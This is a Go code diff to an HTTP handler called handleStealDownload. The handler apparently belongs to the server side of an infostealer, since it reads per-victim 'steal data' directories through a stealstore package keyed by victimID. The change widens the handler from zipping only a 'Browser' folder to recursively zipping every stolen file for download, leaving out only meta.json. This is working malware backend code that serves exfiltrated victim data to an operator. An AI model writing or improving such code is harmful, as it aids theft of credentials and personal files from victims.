@@ -80,12 +80,20 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 	}
 
 	dir := stealstore.DataDir(victimID)
-	browserDir := filepath.Join(dir, "Browser")
-	fmt.Printf("[steal-download] dir=%s browserDir=%s\n", dir, browserDir)
+	fmt.Printf("[steal-download] dir=%s\n", dir)
 
-	entries, err := os.ReadDir(browserDir)
-	fmt.Printf("[steal-download] entries=%d err=%v\n", len(entries), err)
-	if err != nil || len(entries) == 0 {
+	hasFiles := false
+	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
+		if err != nil {
+			return nil
+		}
+		if !d.IsDir() && d.Name() != "meta.json" {
+			hasFiles = true
+		}
+		return nil
+	})
+
+	if !hasFiles {
 		http.Error(w, "no steal data", http.StatusNotFound)
 		return
 	}
@@ -96,18 +104,25 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 	zw := zip.NewWriter(w)
 	defer func() { _ = zw.Close() }()
 
-	for _, e := range entries {
-		if e.IsDir() {
-			continue
+	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
+		if err != nil || d.IsDir() {
+			return nil
 		}
-		data, err := os.ReadFile(filepath.Join(browserDir, e.Name()))
-		if err != nil {
-			continue
+		if d.Name() == "meta.json" {
+			return nil
 		}
-		fw, err := zw.Create("Browser/" + e.Name())
+		rel, _ := filepath.Rel(dir, path)
+		rel = strings.ReplaceAll(rel, "\\", "/")
+
+		data, err := os.ReadFile(path)
 		if err != nil {
-			continue
+			return nil
+		}
+		fw, err := zw.Create(rel)
+		if err != nil {
+			return nil
 		}
 		_, _ = fw.Write(data)
-	}
+		return nil
+	})
 }
